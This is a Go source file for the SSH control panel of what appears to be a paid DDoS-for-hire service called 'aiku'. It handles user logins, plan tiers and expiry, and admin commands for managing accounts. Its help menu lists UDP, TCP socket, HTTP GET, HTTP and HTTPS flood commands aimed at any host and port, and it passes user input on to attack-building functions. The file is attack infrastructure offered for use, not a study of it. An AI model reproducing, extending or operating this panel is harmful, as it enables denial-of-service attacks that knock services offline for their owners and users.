package main

import (
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"

	"github.com/gliderlabs/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

type Admin struct {
	conn  ssh.Session
	width int
}

func NewAdmin(ssh ssh.Session) *Admin {
	return &Admin{conn: ssh, width: 80}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	if ptyReq, winCh, ok := this.conn.Pty(); ok {
		this.width = ptyReq.Window.Width
		bannerWidthMu.Lock()
		bannerWidth = this.width
		bannerWidthMu.Unlock()

		go func() {
			for win := range winCh {
				this.width = win.Width
				bannerWidthMu.Lock()
				bannerWidth = win.Width
				bannerWidthMu.Unlock()
			}
		}()
	}

	var userInfo AccountInfo
	userInfo = database.GetAccountInfo(this.conn.User())

	this.conn.Write([]byte("\r\n\033[0m"))

	// home screen
	this.conn.Write([]byte(banner()))
	this.conn.Write([]byte(centerText("Welcome back, "+userInfo.username, this.width, "\033[97m")))
	this.conn.Write([]byte(centerText("Type \"help\" for a list of commands.", this.width, "\033[90m")))
	this.conn.Write([]byte("\r\n"))

	go func() {
		for {
			time.Sleep(time.Second)
			var expiryString = ""
			var timee = time.Until(time.Unix(int64(userInfo.expiry), 0))
			if userInfo.expiry != -1 {
				if int64(timee.Hours()) == 0 {
					expiryString = fmt.Sprintf("%dm", int64(timee.Minutes()))
				} else {
					expiryString = fmt.Sprintf("%dh %dm", int64(timee.Hours()), int64(timee.Minutes()))
				}
			} else {
				expiryString = "None"
			}
			this.SetTitle("aiku | User: [" + userInfo.username + "] | Expiry: [" + expiryString + "]")
		}
	}()

	for {
		term := terminal.NewTerminal(this.conn, userInfo.username+"@aiku ")
		cmd, err := term.ReadLine()
		if err != nil {
			return
		}
		cmd = strings.TrimSpace(cmd)
		lower := strings.ToLower(cmd)

		if lower == "" {
			continue
		}
		if lower == "clear" || lower == "cls" || lower == "c" {
			this.ClearScreen()
			continue
		}
		if lower == "help" || lower == "?" {
			this.WriteHelp()
			continue
		}
		if lower == "exit" || lower == "quit" || lower == "logout" {
			return
		}
		if strings.HasPrefix(lower, "adduser") && userInfo.rank >= 1 {
			this.handleAddUser(lower)
			continue
		}
		if strings.HasPrefix(lower, "deluser") && userInfo.rank >= 1 {
			this.handleDelUser(lower)
			continue
		}
		if strings.HasPrefix(lower, "users") && userInfo.rank >= 1 {
			this.handleListUsers()
			continue
		}

		atk, err := NewAttack(lower)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			continue
		}

		atk.User = userInfo.username
		plan := planName(userInfo.rank)

		out, _, err := atk.Build(plan)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
			continue
		}
		this.conn.Write([]byte(out))
	}
}

func (this *Admin) WriteHelp() {
	this.conn.Write([]byte("\033[97mAvailable commands:\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  udp <host> <port> <time>       UDP flood\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  socket <host> <port> <time>    TCP socket flood\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  get <host> <port> <time>       HTTP GET flood\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  http <host> <port> <time>      HTTP flood\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  https <host> <port> <time>     HTTPS flood\033[0m\r\n"))
	this.conn.Write([]byte("\033[97mAdmin:\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  users                          list all users\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  adduser <name> <pass>          add a user\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  deluser <name>                 delete a user\033[0m\r\n"))
	this.conn.Write([]byte("\033[97mGeneral:\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  clear                          clear screen\033[0m\r\n"))
	this.conn.Write([]byte("\033[90m  exit                           disconnect\033[0m\r\n"))
}

func (this *Admin) handleAddUser(cmd string) {
	parts := strings.Fields(cmd)
	if len(parts) != 3 {
		this.conn.Write([]byte("\033[91mUsage: adduser <username> <password>\033[0m\r\n"))
		return
	}
	username := parts[1]
	password := parts[2]
	if err := database.AddUser(username, password, 1, 0, -1); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", err.Error())))
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\033[92mUser %s added.\033[0m\r\n", username)))
}

func (this *Admin) handleDelUser(cmd string) {
	parts := strings.Fields(cmd)
	if len(parts) != 2 {
		this.conn.Write([]byte("\033[91mUsage: deluser <username>\033[0m\r\n"))
		return
	}
	if err := database.DeleteUser(parts[1]); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", err.Error())))
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\033[92mUser %s deleted.\033[0m\r\n", parts[1])))
}

func (this *Admin) handleListUsers() {
	users := database.ListUsers()
	if len(users) == 0 {
		this.conn.Write([]byte("\033[90mno users\033[0m\r\n"))
		return
	}
	this.conn.Write([]byte("\033[97m  username              plan     expiry\033[0m\r\n"))
	for _, name := range users {
		info := database.GetAccountInfo(name)
		var expiryStr string
		if info.expiry == -1 {
			expiryStr = "never"
		} else {
			t := time.Until(time.Unix(int64(info.expiry), 0))
			if t < 0 {
				expiryStr = "expired"
			} else if int64(t.Hours()) == 0 {
				expiryStr = fmt.Sprintf("%dm", int64(t.Minutes()))
			} else {
				expiryStr = fmt.Sprintf("%dh %dm", int64(t.Hours()), int64(t.Minutes()))
			}
		}
		this.conn.Write([]byte(fmt.Sprintf(
			"\033[90m  %-20s  %-8s %s\033[0m\r\n",
			name, planName(info.rank), expiryStr,
		)))
	}
}

func (this *Admin) SendMessage(message string, newline bool) {
	if newline {
		this.conn.Write([]byte(message + "\r\n"))
	} else {
		this.conn.Write([]byte(message))
	}
}

func (this *Admin) ClearScreen() {
	this.conn.Write([]byte(banner()))
	this.conn.Write([]byte(centerText("Welcome back, "+this.conn.User(), this.width, "\033[97m")))
	this.conn.Write([]byte(centerText("Type \"help\" for a list of commands.", this.width, "\033[90m")))
	this.conn.Write([]byte("\r\n"))
}

func (this *Admin) SetTitle(message string) {
	this.conn.Write([]byte("\033]0;" + message + "\007"))
}

func planName(rank int) string {
	switch rank {
	case 1:
		return "Admin"
	case 2:
		return "VIP"
	case 3:
		return "Premium"
	default:
		return "Free"
	}
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var _ = strconv.Atoi